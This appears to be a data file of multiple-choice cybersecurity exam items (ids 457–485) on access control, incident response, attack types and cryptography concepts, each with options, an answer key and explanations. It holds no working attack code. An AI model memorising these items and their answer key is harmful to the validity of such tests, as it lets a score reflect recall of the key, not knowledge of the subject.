  {id:457,domain:A,question:"What is a virtual private network (VPN)?",options:["A software-defined networking model that eliminates physical cables by routing all traffic through virtual switches, SDN controllers, and overlay network protocols","A technology that creates an encrypted tunnel between a client and a server, providing secure remote access and hiding internet traffic from intermediaries","A virtualized computing instance deployed within a hypervisor that is assigned a non-routable private IP address and isolated from direct external internet connectivity","An isolated internal network segment within a virtualized data center, accessible only to virtual machines sharing the same hypervisor host or virtual switch configuration"],answer:1,explanation:"VPNs encrypt traffic end-to-end (IPsec site-to-site or SSL/TLS remote access), securing communications over untrusted networks like public WiFi or the internet.",optionExplanations:["Software-defined networks virtualize network functions but still rely on physical infrastructure; VPNs use physical networks to create logical private encrypted tunnels.","A VPN encrypts traffic between endpoints, creating a private tunnel over public internet — enabling secure remote access to corporate resources and protecting against eavesdropping.","Virtual machines with private IPs are compute virtualization providing network isolation; VPNs are a networking technology creating encrypted communication tunnels between remote endpoints.","Hypervisor-internal virtual networks isolate compute workloads within a virtualization platform; VPNs extend private network access securely to remote clients over public internet."]},
  {id:458,domain:O,question:"What is a post-mortem (lessons learned) in incident response?",options:["A medical or legal forensic procedure performed by a pathologist to determine the official cause, manner, and contributing circumstances of a person's death","A structured review conducted after an incident to understand what happened, what worked, what failed, and how to improve future response","A comprehensive catalog of all systems, servers, and services that were destroyed, disabled, or permanently taken offline as a direct result of a cyberattack","A mandatory incident disclosure report submitted to law enforcement agencies documenting the cyberattack timeline, affected systems, data involved, and suspected threat actor"],answer:1,explanation:"Post-mortems identify gaps in detection, response time, communication, and playbooks — converting negative experiences into organizational security improvements.",optionExplanations:["Medical post-mortem refers to an autopsy procedure; in incident response the term is used metaphorically to describe a structured security incident retrospective review.","A post-incident review examines the timeline, what was detected and when, response effectiveness, communication flow, and identifies specific improvements to policies, tools, and training.","Documenting impacted systems is part of the incident impact assessment; post-mortem is a separate retrospective process improvement activity conducted after containment and recovery.","Law enforcement reporting may be required for certain incidents; post-mortems focus on internal lessons learned and process improvement, not external agency reporting requirements."]},
  {id:459,domain:T,question:"What is an advanced persistent threat (APT)?",options:["A recurring technical problem where a software update package repeatedly fails to install correctly, causing system instability and requiring manual IT intervention to resolve","A sophisticated, long-term attack by a well-resourced adversary (often nation-state) that maintains extended unauthorized access to achieve strategic objectives","A fully automated botnet-driven malware distribution operation that persistently deploys payloads to large numbers of unrelated victims using pre-programmed known exploits","A highly sophisticated next-generation firewall capability specifically designed to continuously absorb and deflect sustained volumetric denial-of-service attack traffic without service interruption"],answer:1,explanation:"APT groups (APT28/Fancy Bear, APT41) conduct targeted espionage, intellectual property theft, or sabotage — maintaining access for months or years while avoiding detection.",optionExplanations:["Software update installation failures are IT operations issues; APTs are sophisticated, long-term targeted attack campaigns conducted by well-funded and organized adversary groups.","APTs are characterized by advanced techniques, well-funded adversaries, long-term persistence in target networks, and specific strategic objectives — typically espionage or disruption.","Automated malware campaigns are typically opportunistic and broadly targeted; APTs are manually guided, carefully targeted intrusions against specific high-value organizations with strategic objectives.","Firewalls are defensive devices that block incoming attacks; APTs are threat actor groups conducting long-term, targeted intrusion campaigns to maintain persistent access inside organizations."]},
  {id:460,domain:G,question:"What is the principle of separation of duties?",options:["Structurally separating cybersecurity and IT operations into distinct organizational departments, each with independent management chains, budgets, and executive reporting structures","Dividing critical functions across multiple individuals so no single person can complete a sensitive task alone, reducing fraud and error risk","Deploying dedicated, isolated IT systems, applications, and data stores for each business unit to prevent cross-departmental access to sensitive information or processes","Maintaining strictly separate development, staging, and production environments with independent credentials, access controls, and change management processes to prevent unauthorized modifications"],answer:1,explanation:"Separation of duties prevents insider fraud — in finance, the person who approves payments shouldn't also be the person who processes them or reconciles accounts.",optionExplanations:["Separating security and IT organizational reporting lines can support SoD but is not its definition; SoD prevents any single individual from controlling a complete sensitive transaction.","SoD ensures fraud requires collusion between multiple people — a developer who writes code shouldn't also be able to deploy it to production, or an accountant who requests payments shouldn't approve them.","Business unit system isolation is data segregation; SoD specifically divides the steps of sensitive processes across multiple people to require collusion for fraud.","Dev/prod environment separation prevents unauthorized production changes; SoD divides job responsibilities within business processes so no single person can complete a sensitive task alone."]},
  {id:461,domain:O,question:"What is a disaster recovery plan (DRP)?",options:["A formally documented physical emergency procedure specifying evacuation routes, assembly points, floor warden assignments, and occupant accountability procedures during a fire or life-safety event","A documented strategy and procedures for recovering IT systems and data following a disruptive incident, ensuring business continuity","A step-by-step procedure for restoring accidentally or maliciously deleted files and database records from backup media using point-in-time recovery or versioning capabilities","A high-level organizational plan that addresses how a company maintains essential services, workforce functions, and customer operations throughout any type of major disruptive event"],answer:1,explanation:"DRPs specify recovery procedures, responsible parties, RTOs/RPOs, and restoration steps for specific scenarios — they must be regularly tested to be effective.",optionExplanations:["Fire evacuation plans address physical emergency egress; a DRP specifically addresses IT system and data recovery after disruptive technical or physical incidents affecting operations.","A DRP details how to restore IT infrastructure after events like ransomware, hardware failure, natural disaster, or facility loss — with specific procedures, contact lists, and recovery targets.","Accidental deletion recovery is one scenario a DRP covers; DRPs address the full spectrum of IT system recovery including ransomware, hardware failure, and facility loss.","Business continuity plans address overall operational survival including people, processes, and facilities; DRPs specifically focus on IT infrastructure and data recovery objectives and procedures."]},
  {id:462,domain:T,question:"What is a watering hole attack's key advantage over spear phishing?",options:["The attack succeeds without requiring victims to have active outbound internet connectivity, functioning entirely through redirected requests within an organization's internal network","The victim initiates the contact by visiting a known legitimate site, making it harder to train users to avoid","It reaches a broader and more diverse victim population because attackers do not need to research and individually identify each specific high-value target","It deploys more technically advanced browser exploits and zero-day vulnerabilities than the malicious links and attachments used in standard spear phishing email campaigns"],answer:1,explanation:"Watering hole attacks compromise sites victims already trust and visit regularly — unlike suspicious emails, visiting a trusted website doesn't trigger security awareness alarms.",optionExplanations:["Watering holes require internet-accessible compromised websites; the defining advantage is that victims voluntarily visit sites they trust, not that the attack bypasses internet access.","The strategic advantage is that victims come to the attacker voluntarily by visiting sites they believe are legitimate — security training teaches people to be suspicious of emails, but less suspicious of familiar websites.","Watering holes are actually more targeted than generic phishing, aimed at specific professional groups visiting known sector websites; broad reach is not the key advantage.","Both attack types can use sophisticated malware; the strategic advantage of watering holes is that victims voluntarily visit the compromised site, making user training less effective."]},
  {id:463,domain:A,question:"What is role-based access control (RBAC)?",options:["Controlling access based on an employee's role in a physical workspace","Granting access permissions based on predefined roles that align with job functions, rather than individually assigning permissions to each user","A security vetting process where users demonstrate job role competency by completing simulated authorization scenarios before they are assigned any system access permissions","An access model where individual department managers manually evaluate and approve each resource access request from their direct reports on a case-by-case basis"],answer:1,explanation:"RBAC simplifies access management — instead of configuring per-user permissions, administrators manage roles, and users inherit permissions from their assigned roles.",optionExplanations:["Physical workspace roles are physical access controls; RBAC is a digital access control model.","RBAC assigns permissions to roles (Developer, Accountant, HR Specialist) and then assigns users to roles — making access management scalable and consistent with job responsibilities.","Competency demonstrations are training assessments; RBAC assigns permissions based on defined job roles within the organization, not on performance in simulated scenarios.","Manager-controlled per-request access decisions describe a discretionary access model; RBAC is a structured, policy-driven model assigning permissions through predefined roles to all role members."]},
  {id:464,domain:P,question:"What is the difference between a privacy policy and a privacy notice?",options:["A privacy policy and privacy notice are synonymous terms that organizations use interchangeably to describe the same required disclosure document provided to all data subjects","A privacy policy is the internal governance document; a privacy notice is the external communication to individuals about how their data is used","Privacy notices serve as internal communications to employees about HR data processing, while privacy policies are external-facing documents published for customer and partner review","Privacy policies are legally binding documents enforceable by regulators, while privacy notices are voluntary transparency disclosures that organizations publish without any legal obligation"],answer:1,explanation:"Privacy policies govern internal processes; privacy notices (also called privacy statements) are the public-facing communications required by regulations like GDPR.",optionExplanations:["Privacy policies and privacy notices serve different audiences and purposes; conflating them is a common error that can result in compliance gaps under GDPR requirements.","The privacy policy guides internal practices; the privacy notice (required by GDPR Article 13) explains data practices to individuals whose data is collected.","Both apply across stakeholder groups; the key distinction is internal governance (policy guiding operations) versus external communication (notice informing data subjects of their rights).","Both have legal significance under regulations like GDPR; privacy notices are legally required under Article 13/14, while privacy policies are internal governance documents."]},
  {id:465,domain:O,question:"What is a threat intelligence feed?",options:["A social media platform or blog that aggregates cybersecurity news articles, vendor announcements, and breach disclosures for security professionals to follow and stay informed","A stream of data providing current information about threats, indicators of compromise (IoCs), threat actors, and vulnerabilities to improve defensive capabilities","An automated notification stream generated by SIEM tools, IDS sensors, and endpoint security software when suspicious events are detected within the organization's environment","A subscription service providing periodic cybersecurity alerts and advisories issued by government agencies such as CISA, FBI, or sector-specific regulatory bodies"],answer:1,explanation:"Threat intelligence feeds (AlienVault OTX, MISP, commercial feeds) provide IoCs (malicious IPs, domains, file hashes) that can be ingested into SIEM, firewalls, and EDR for automated blocking.",optionExplanations:["Cybersecurity news aggregators provide informational awareness; threat intelligence feeds are structured, machine-readable operational data used to configure security controls and detection systems.","Threat intelligence feeds deliver structured, machine-readable data (STIX/TAXII format) containing current IoCs, malware signatures, and TTP information that security tools can act on automatically.","Security monitoring alerts are outputs from your own tools detecting internal events; threat intelligence feeds are external inputs providing data about the broader threat landscape.","Government advisories are one source of threat intelligence; commercial and ISAC feeds provide higher-frequency, more granular, machine-readable technical indicators for automated security tool integration."]},
  {id:466,domain:T,question:"What is credential harvesting?",options:["Securely storing employee and service account credentials in an encrypted hardware security module or purpose-built privileged access management vault to prevent unauthorized exposure","Collecting user credentials through phishing, malware, or OSINT to use for unauthorized access","Extracting and analyzing large credential datasets from breach dumps and dark web repositories to identify patterns in password reuse across organizations and industries","Automatically generating and provisioning secure initial passwords and MFA enrollment links for new employee accounts during the IT onboarding and identity provisioning process"],answer:1,explanation:"Credential harvesters use fake login pages, keyloggers, password stealers, and breach databases to collect credentials for account takeover and lateral movement.",optionExplanations:["Storing credentials in a hardware vault is secure credential management; harvesting is the malicious act of collecting credentials from existing users for unauthorized access.","Credential harvesting collects authentication credentials through any means — fake login pages, InfoStealer malware, phishing emails, or purchasing breach data — for unauthorized access.","Analyzing breach data for research is threat intelligence work; credential harvesting is an attacker activity actively collecting credentials from victims for unauthorized system access.","Employee credential provisioning is IT identity management; credential harvesting is an attacker activity stealing authentication credentials from existing users through deceptive or malicious means."]},
  {id:467,domain:G,question:"What is the purpose of a Trusted Platform Module (TPM)?",options:["A software component providing a sandboxed execution environment for automated security testing that validates application behavior against defined security requirements and threat models","A hardware security chip that generates, stores, and manages cryptographic keys, enables secure boot, and provides device attestation","A security module that maintains and enforces an approved software vendor list, blocking installation of applications from unauthorized, unverified, or untrusted publishing organizations","A portable hardware device such as a FIDO2 security key or smart card that users carry separately and insert to authenticate their identity to systems"],answer:1,explanation:"TPM 2.0 enables BitLocker drive encryption key protection, Secure Boot, device health attestation, and is required for Windows 11 — providing hardware-anchored security.",optionExplanations:["Software testing security modules are development and QA tools; TPM is a dedicated hardware security chip providing cryptographic key generation, storage, and device attestation functions.","A TPM chip generates random numbers, stores keys in protected hardware, measures the boot process, and provides cryptographic evidence of device state — anchoring trust in hardware.","Software vendor trust lists are application whitelisting or code signing policy enforcement; TPM handles cryptographic key protection, platform integrity measurement, and hardware-rooted device attestation.","Portable authentication tokens are external MFA hardware devices; TPM is an integrated chip soldered onto the motherboard that enables platform security features within the device itself."]},
  {id:468,domain:A,question:"What is attribute-based access control (ABAC)?",options:["A file system permission model that grants read, write, or execute access to resources based on metadata attributes embedded in each individual file's properties","A flexible access control model that grants access based on attributes of the user, resource, environment, and action — enabling fine-grained, context-aware policies","An authentication mechanism that requires users to present multiple identity attributes such as username, password, and a biometric factor before access is granted","An enhanced version of role-based access control that supplements job-role assignments with additional identity verification steps before granting access to sensitive resources"],answer:1,explanation:"ABAC can express policies like 'a physician can access patient records from hospital-approved devices during working hours in clinical locations' — far more expressive than RBAC.",optionExplanations:["File system attribute-based permissions are a basic OS access control model; ABAC is a comprehensive policy-based model evaluating multiple attribute categories to make access decisions.","ABAC evaluates multiple attributes simultaneously: user attributes (role, department, clearance), resource attributes (classification, type), and environmental attributes (time, location, device) to make access decisions.","Multi-factor authentication requires multiple credential types; ABAC is an authorization model using user, resource, and environmental attributes to determine access rights after authentication.","ABAC can incorporate roles as one attribute among many, but it is a distinct and more flexible model than RBAC, not simply RBAC with extra verification steps."]},
  {id:469,domain:O,question:"What is a security gap analysis?",options:["Evaluating network throughput, latency, and bandwidth utilization against defined service-level objectives to identify capacity shortfalls that require infrastructure upgrades or optimization","A comparison of current security capabilities against desired state or industry framework requirements to identify weaknesses and prioritize improvements","Identifying unprotected pathways, misconfigured rules, or coverage gaps in firewalls, DMZ configurations, and perimeter intrusion detection systems protecting the network boundary","An evaluation of physical security controls that identifies camera coverage gaps, unmonitored entry points, and areas lacking badge readers or security guard patrol coverage"],answer:1,explanation:"Gap analyses compare current security state against frameworks (NIST CSF, ISO 27001, CIS Controls) to create prioritized roadmaps for security program improvement.",optionExplanations:["Network performance gaps are capacity planning concerns; security gap analysis assesses security program capability maturity against a framework, not network operational performance metrics.","A gap analysis maps current controls to a framework, identifies where controls are absent or insufficient, and creates a prioritized remediation roadmap based on risk and effort.","Perimeter security gap assessment is one component of a broader security gap analysis; the full process covers all security domains across the entire security program.","Physical security assessments evaluate facility controls; security gap analysis covers the entire security program including people, process, and technology controls against a comprehensive framework."]},
  {id:470,domain:T,question:"What is a drive-by download attack?",options:["Inserting a removable USB flash drive containing pre-loaded malware that automatically executes via autorun functionality when plugged into an unprotected victim computer","Malware installation that occurs automatically when a user visits a compromised or malicious website, without any user action beyond browsing","Deceiving victims into downloading and manually executing a counterfeit software update that delivers malware disguised as a legitimate application upgrade or security patch","Distributing trojanized document files or media that execute embedded malicious macros, exploit code, or payloads when the victim opens them in an application"],answer:1,explanation:"Drive-by downloads exploit browser or plugin vulnerabilities (Java, Flash, PDF reader) — simply visiting a page installs malware without clicks or downloads.",optionExplanations:["USB-based malware delivery exploits removable media autorun; drive-by downloads exploit browser vulnerabilities automatically when users visit compromised websites, requiring no physical media.","Drive-by downloads require no user interaction beyond visiting a web page — the exploit kit detects vulnerable browser components and automatically installs malware.","Fake software update attacks require user interaction to download and execute; true drive-by downloads are completely automatic, requiring no user action beyond visiting a web page.","Trojanized files that execute on open require user interaction to open; drive-by downloads install malware automatically through browser or plugin vulnerabilities without any user file interaction."]},
  {id:471,domain:G,question:"What is a key derivation function (KDF)?",options:["A cryptographic utility that takes random bytes from a hardware or software random number generator and formats them directly into fixed-length cryptographic key material","A cryptographic function that derives one or more secret keys from a master secret using a pseudorandom function, adding salt and iterations to resist brute force","A cryptographic protocol such as Diffie-Hellman or ECDH that enables two parties to independently compute a shared secret value over an untrusted public channel","A mathematical algorithm such as RSA key generation or elliptic curve cryptography that produces linked public and private key pairs for asymmetric encryption operations"],answer:1,explanation:"KDFs like PBKDF2, bcrypt, and Argon2 are deliberately slow — iteration counts make brute force infeasible even with fast hardware like GPUs.",optionExplanations:["KDFs do use randomness inputs like salt, but they derive keys from a low-entropy input secret rather than purely from random number generator output alone.","KDFs (PBKDF2, scrypt, Argon2) stretch low-entropy inputs like passwords into cryptographic keys through many rounds of hashing with salt — making each guess computationally expensive.","Key exchange protocols establish shared secrets between parties; KDFs derive one or more keys from an existing master secret using iterative hashing with salt.","Asymmetric key pair generation produces public/private keys for PKI operations; KDFs derive symmetric keys or multiple keys from a master secret or low-entropy password."]},
  {id:472,domain:P,question:"What is the privacy by default principle?",options:["Configuring systems to automatically collect and retain all available personal data attributes from users by default unless they explicitly submit an opt-out request","Configuring systems to process the minimum necessary personal data by default, requiring users to actively opt-in to share more","Configuring all privacy and data sharing settings to be visible and accessible to other users or the public by default, requiring individuals to manually restrict them","Applying privacy configuration controls automatically to newly created system default accounts while leaving administrator, service, and power user accounts outside the scope of those settings"],answer:1,explanation:"GDPR Article 25 requires privacy by default — when launching a social network, privacy should be maximum by default, not exposing profiles to everyone unless users choose to.",optionExplanations:["Maximum data collection by default is the opposite of privacy by default; the principle requires the most privacy-protective option as the starting configuration state.","Privacy by default means the most privacy-friendly option is the default choice — users shouldn't need to navigate settings to protect their privacy; that should be the starting state.","Making privacy settings public by default maximizes data exposure; privacy by default requires maximum privacy protection from the outset so users need not take action.","Privacy by default applies to all user accounts and system configurations from launch; it is not limited to default accounts or any subset of users."]},
  {id:473,domain:A,question:"What is security-as-code?",options:["Using automated static analysis code scanning tools to search application source code for known vulnerability patterns, insecure functions, and security defects before deployment","Expressing security policies, configurations, and controls as code that can be version-controlled, reviewed, tested, and automatically enforced","Writing application source code that adheres to secure coding standards, input validation practices, and cryptographic guidelines to minimize the number of exploitable software vulnerabilities","Generating security compliance reports and operational dashboards automatically using scripting and APIs that aggregate data from multiple security monitoring and logging tools"],answer:1,explanation:"Security-as-code enables policy drift detection, peer review of security configurations, and automated enforcement — bringing software engineering rigor to security operations.",optionExplanations:["Searching code for vulnerabilities is static application security testing; security-as-code specifically defines security policies, configurations, and controls as version-controlled code artifacts.","Security-as-code expresses firewall rules, IAM policies, compliance checks, and security baselines as code artifacts — enabling version control, automated testing, and consistent deployment.","Writing secure code is secure software development; security-as-code is about expressing security infrastructure configurations and enforcement policies as version-controlled code artifacts.","Automated security reporting is a useful capability; security-as-code is a broader methodology expressing the full security configuration as code for version control and automated enforcement."]},
  {id:474,domain:O,question:"What is mean time to respond (MTTR) in security operations?",options:["The average duration that customer support staff require to acknowledge, investigate, and resolve service tickets submitted through the organizational help desk system","The average time from detecting a security incident to containing it and restoring normal operations","The average elapsed time between a security researcher submitting a vulnerability disclosure report and the vendor publishing an acknowledgment or issuing a remediation patch","The average elapsed time between a vulnerability being publicly disclosed or discovered internally and the organization successfully deploying the vendor-supplied remediation patch across all affected systems"],answer:1,explanation:"MTTR measures response effectiveness — lower MTTR reduces attacker dwell time and damage. SOAR automation is a primary way to reduce MTTR.",optionExplanations:["Customer inquiry response time is a customer service metric; MTTR in security operations measures effectiveness of the security team's incident detection-to-restoration cycle.","MTTR (sometimes Mean Time to Repair) measures how quickly the security team moves from detection through containment to restoration — directly relating to attacker impact limitation.","Vulnerability report response time is a vendor disclosure metric; MTTR specifically measures the security operations team's speed from incident detection through containment and service restoration.","Patch deployment time is tracked as mean time to patch; MTTR specifically measures the full incident response cycle from initial detection through containment and normal operations restoration."]},
  {id:475,domain:T,question:"What is homograph attack (IDN homograph attack)?",options:["Crafting written content that uses English words spelled identically but carrying different meanings to obscure the intended communication from automated security content filters","Using visually similar Unicode characters to create domain names that look identical to legitimate domains, deceiving users into visiting malicious sites","Embedding concealed text or hidden data within document files using white-on-white font, invisible layers, or metadata fields to evade casual visual inspection","Exploiting weaknesses in graph-based network analysis and threat detection tools by inserting adversarial relationship data that distorts trust scoring and anomaly detection results"],answer:1,explanation:"Internationalized domain name (IDN) homograph attacks use Cyrillic 'а' instead of Latin 'a' — 'apple.com' and 'аpple.com' look identical but point to different servers.",optionExplanations:["English-language homographs are a linguistics concept; IDN homograph attacks specifically exploit Unicode character visual similarity in domain names to deceive users browsing the web.","IDN homograph attacks register domains using Unicode characters that are visually indistinguishable from common Latin characters — the Cyrillic 'а' looks identical to Latin 'a' at normal viewing distances.","Hidden text in documents is a form of data concealment; homograph attacks exploit visual similarity between Unicode domain name characters, not document content manipulation.","Graph-based tool exploitation is a different attack category; IDN homograph attacks specifically register Unicode domain names that are visually indistinguishable from legitimate Latin-character domains."]},
  {id:476,domain:G,question:"What is certificate pinning?",options:["Displaying printed copies of TLS certificates on physical bulletin boards or security notice areas so staff can manually compare and verify certificate fingerprints","Hardcoding or storing specific certificate details in an application to reject any other certificate, even from a trusted CA","An administrative practice of organizing digital certificate files into structured directory hierarchies, naming conventions, and archiving systems for certificate lifecycle management purposes","Scheduling automated calendar alerts and renewal tasks to notify certificate administrators before SSL/TLS certificate expiration dates to ensure timely certificate renewal and replacement"],answer:1,explanation:"Certificate pinning prevents MitM attacks using rogue CA-signed certificates — mobile banking apps pin their server certificate so attackers can't intercept with their own valid certificate.",optionExplanations:["Physically displaying certificates is an informal verification practice; certificate pinning is a software security technique that embeds expected certificate details directly in application code.","Certificate pinning (or public key pinning) builds expected certificate details into the application — if the presented certificate doesn't match what's expected, the connection is rejected even if it's validly signed.","File organization is an administrative task; certificate pinning is a security control embedded in application code that rejects any certificate not matching a pre-stored expected value.","Calendar-based expiration alerts support certificate lifecycle management; certificate pinning is about rejecting unexpected certificates during TLS handshakes to prevent man-in-the-middle interception."]},
  {id:477,domain:A,question:"What is east-west traffic in network security?",options:["Network traffic that originates in eastern-region data centers and is routed through backbone interconnects to servers physically located in western geographic regions of a country","Traffic flowing laterally between servers and workloads within the same data center or network segment, as opposed to north-south traffic to/from the internet","The routing paths and priority queues through which email messages traverse mail transfer agents, spam filters, and delivery servers within an organization's messaging infrastructure","Wide-area network traffic flowing between an organization's geographically distributed branch offices across MPLS circuits, SD-WAN overlays, or site-to-site VPN connections in multiple directions"],answer:1,explanation:"Most intrusion detection focuses on north-south (perimeter) traffic; attackers use east-west movement (lateral movement) to reach valuable targets inside the network.",optionExplanations:["Geographic server location is unrelated to east-west traffic; the terms describe logical traffic flow direction — lateral between internal systems versus vertical between internal and external networks.","East-west traffic flows between internal systems — server-to-server, VM-to-VM; north-south flows between internal systems and external networks. Microsegmentation controls east-west to prevent lateral movement.","Email routing is a messaging infrastructure concept; east-west traffic describes lateral data center traffic between internal servers and workloads, distinct from north-south internet-bound flows.","Branch office inter-site traffic is WAN connectivity; east-west specifically describes intra-data-center or intra-segment lateral traffic between servers and workloads within the same environment."]},
  {id:478,domain:O,question:"What is the purpose of security metrics?",options:["Demonstrating to management how much time and effort the security team expends on daily operational tasks, alert triage, and incident response activities each month","Providing quantifiable measures of security program effectiveness to support risk decisions, justify investments, and track improvement over time","Evaluating the throughput, packet loss, and latency characteristics of the network infrastructure on which security monitoring, enforcement, and logging tools are deployed","Tallying the total count of confirmed security incidents logged by the SIEM and incident management system during a defined monthly or quarterly reporting period"],answer:1,explanation:"Security metrics (patch compliance %, MTTD, vulnerability density, phishing click rates) enable data-driven security management and demonstrate value to executive leadership.",optionExplanations:["Workload reporting is an operational tracking activity; security metrics specifically measure program effectiveness, risk posture, and security control performance to inform strategic decisions.","Security metrics translate security activities into quantifiable data that executives can use to understand risk posture, allocate budget, and track progress toward security goals.","Network performance measurement is operational capacity management; security metrics specifically quantify security program effectiveness, risk levels, and control performance for security decision-making.","Incident counts are one basic security metric; a comprehensive metrics program covers vulnerability age, detection coverage, response speed, and compliance posture across the full security program."]},
  {id:479,domain:T,question:"What is a man-in-the-middle (MitM) attack?",options:["An attack requiring the adversary to physically position themselves between two communicating parties, such as between a network switch port and a workstation connection","An attack where the adversary secretly intercepts and potentially alters communications between two parties who believe they are communicating directly with each other","A social engineering technique that uses a trusted third-party intermediary to convey fraudulent instructions from an attacker to an unsuspecting target organization or individual","An attack that exploits vulnerabilities in middleware software such as message queues, API gateways, or enterprise service buses to intercept and manipulate application data flows"],answer:1,explanation:"MitM attacks (via ARP poisoning, rogue APs, SSL stripping) allow attackers to read, modify, and inject traffic — defeated by proper certificate validation and encryption.",optionExplanations:["MitM attacks can be conducted remotely over networks; physical presence is not required, as network-based techniques like ARP poisoning work without physical proximity.","A MitM attacker positions themselves in the communication path — intercepting, reading, potentially modifying, and forwarding communications between two parties who think they communicate directly.","Social engineering using intermediaries is impersonation or pretexting; MitM attacks are technical attacks that intercept and optionally modify actual network communications between two parties.","Middleware exploitation targets application infrastructure vulnerabilities; MitM attacks intercept the communication channel between two parties who believe they are communicating directly with each other."]},
  {id:480,domain:G,question:"What is the concept of least privilege?",options:["Compensating security personnel at the minimum salary level allowed by employment law or contract to reduce the organization's operating costs in the IT security department","Granting users, processes, and systems only the minimum permissions necessary to perform their intended functions, reducing the attack surface","Granting elevated administrative system permissions only during pre-scheduled maintenance windows and automatically revoking all privileged access immediately when the maintenance period concludes","Selecting and deploying the most cost-effective security tools and controls available that satisfy minimum regulatory compliance requirements while minimizing capital and operational expenditure"],answer:1,explanation:"Least privilege limits damage from compromised accounts, insider threats, and malware — a compromised standard user account can't modify system files they have no business accessing.",optionExplanations:["Salary minimization is an HR and budget management decision; least privilege is a security design principle governing the scope of access permissions granted to users and processes.","Least privilege ensures each entity has exactly the permissions needed to do its job — no more. An HR system doesn't need database admin rights; a web server process doesn't need filesystem write access.","Time-limited elevated access is just-in-time access or break-glass access; least privilege is the ongoing principle of assigning only minimal necessary permissions at all times.","Cost-optimizing security controls is budget management and procurement strategy; least privilege is a security design principle about permissions scope and is independent of financial cost."]},
  {id:481,domain:T,question:"What is adversarial machine learning?",options:["Using artificial intelligence and machine learning models to generate realistic simulations of human adversary behavior for security awareness training or automated red team exercises","Techniques to deceive, manipulate, or poison machine learning models through specially crafted inputs or training data","Training a machine learning model specifically on historical adversary attack data, threat intelligence feeds, and malware samples to improve security detection and classification accuracy","Applying machine learning and predictive analytics to analyze competitor pricing strategies, customer behavior patterns, and market trends to gain strategic business intelligence advantages"],answer:1,explanation:"Adversarial ML attacks include model poisoning (corrupting training data), evasion (inputs that fool classifiers), and model inversion (extracting training data from models).",optionExplanations:["AI-based adversary simulation is a security testing tool; adversarial ML specifically describes techniques that deceive or manipulate machine learning models through crafted inputs or poisoned data.","Adversarial machine learning attacks target AI systems — making malware evade ML-based AV by crafting inputs that the model classifies as benign, or poisoning training data to degrade model performance.","Training security ML models on attack data improves defenders; adversarial ML describes attacks against ML systems themselves, such as evasion through crafted inputs or training data poisoning.","Competitive business analytics using ML is a data science application; adversarial ML is a security domain addressing attacks that target and undermine AI and machine learning systems."]},
  {id:482,domain:A,question:"What is a privileged access workstation (PAW)?",options:["A developer workstation configured with elevated local administrator permissions and access to code repositories, build servers, and deployment pipelines for software development tasks","A hardened, isolated workstation used exclusively for administrative tasks to reduce the risk of credential theft and lateral movement","A standard corporate laptop computer on which the end user has been granted local administrator rights to install software and modify system configuration settings","A single high-security workstation shared by multiple administrators to perform privileged operational tasks, centralizing elevated-access activities to reduce hardware and licensing costs"],answer:1,explanation:"PAWs are separate from regular workstations — no internet browsing, no email, minimal software — so attackers can't steal admin credentials through phishing or drive-by downloads.",optionExplanations:["Developer workstations with elevated permissions facilitate software development workflows; PAWs are specifically hardened and isolated for administrative tasks, not general development or application usage.","A PAW is a dedicated workstation with enhanced security configurations used exclusively for privileged tasks — administrative credentials are only used from this hardened, internet-isolated device.","A laptop with admin rights lacks the isolation and hardening required; PAWs are dedicated devices used exclusively for privileged administrative tasks with no general internet use.","Shared privileged workstations undermine accountability and increase risk; PAWs must be dedicated to specific individual administrators to maintain session isolation and prevent credential cross-contamination."]},
  {id:483,domain:O,question:"What is a cybersecurity framework?",options:["A standardized rack-mount equipment system used in data centers to physically install, organize, cable, and secure network, server, and security appliance hardware components","A structured set of guidelines, best practices, and standards that organizations use to manage and reduce cybersecurity risk","A programming library or API toolkit that provides reusable security modules and abstraction layers for developers to build cybersecurity scanning, detection, or enforcement tool applications","A legally mandated set of specific cybersecurity requirements that organizations within a regulated industry are required to implement, document, and demonstrate compliance with"],answer:1,explanation:"Frameworks (NIST CSF, ISO 27001, CIS Controls) provide structured approaches to building and maturing security programs — enabling consistent risk management.",optionExplanations:["Equipment rack mounting systems are data center physical infrastructure; cybersecurity frameworks are conceptual and procedural guidance documents for managing organizational security risk programs.","A cybersecurity framework provides organized categories of security practices (Identify, Protect, Detect, Respond, Recover) that organizations use to assess current state and plan improvements.","Software development frameworks are coding libraries and platform abstractions; cybersecurity frameworks like NIST CSF are program management guidance for organizational security risk management.","Frameworks are often voluntary guidance rather than mandates; regulations like HIPAA and PCI DSS mandate specific requirements, while frameworks like NIST CSF provide flexible adoptable guidance."]},
  {id:484,domain:T,question:"What is a polymorphic malware?",options:["Malware designed to conduct coordinated simultaneous attacks against multiple different target organizations or network segments within the same large-scale deployment campaign","Malware that constantly changes its code signature while maintaining its functionality to evade signature-based detection","Malware that combines multiple distinct attack techniques such as phishing delivery, browser exploitation, and credential theft to compromise targets through several simultaneous vectors","Malware whose source code has been compiled and packaged into executable versions written in several different programming languages to maximize compatibility across target platforms"],answer:1,explanation:"Polymorphic malware mutates with each infection (using encryption with variable keys, code rearrangement) — its signature never appears twice, defeating traditional antivirus.",optionExplanations:["Multi-target attack campaigns describe attack breadth; polymorphic behavior specifically refers to the mutation of malware code signatures to evade signature-based antivirus detection.","Polymorphic malware uses mutation engines to alter its binary signature with each copy while keeping its malicious functionality — making signature-based detection ineffective against new instances.","Multi-vector attacks describe attack diversity and delivery methods; polymorphism specifically describes the automated code signature mutation that occurs to evade antivirus detection engines.","Multi-language malware implementation is a development characteristic for cross-platform compatibility; polymorphism specifically describes automated signature mutation during propagation to evade detection."]},
  {id:485,domain:G,question:"What is a nonce in cryptography?",options:["A placeholder or filler value inserted into cryptographic protocol message fields that carries no functional significance and can be any arbitrary number without affecting security","A number used once — a random or sequential value that ensures cryptographic operations produce unique results and prevents replay attacks","A configurable initialization parameter passed to a cryptographic hash function that controls internal state setup, output digest length, or the computational work factor of hashing","A computational technique that applies a password hash function repeatedly through thousands of iterations to increase the computational cost of brute-force attacks against stored credentials"],answer:1,explanation:"Nonces in TLS handshakes, TOTP tokens, and challenge-response authentication ensure each session or operation is unique — preventing attackers from reusing captured values.",optionExplanations:["Nonces are not meaningless fillers; they serve the critical cryptographic purpose of ensuring uniqueness in operations and preventing replay attacks by adversaries capturing session data.","A nonce (number used once) ensures that even identical plaintexts produce different ciphertexts, and that captured challenge values cannot be reused by attackers.","Hash function configuration parameters control algorithm behavior; nonces are single-use random or sequential values that ensure cryptographic operations produce unique outputs and prevent replay attacks.","Iterative hashing for work factor increase is key stretching; nonces are single-use random or sequential values that ensure uniqueness in cryptographic operations across sessions."]},
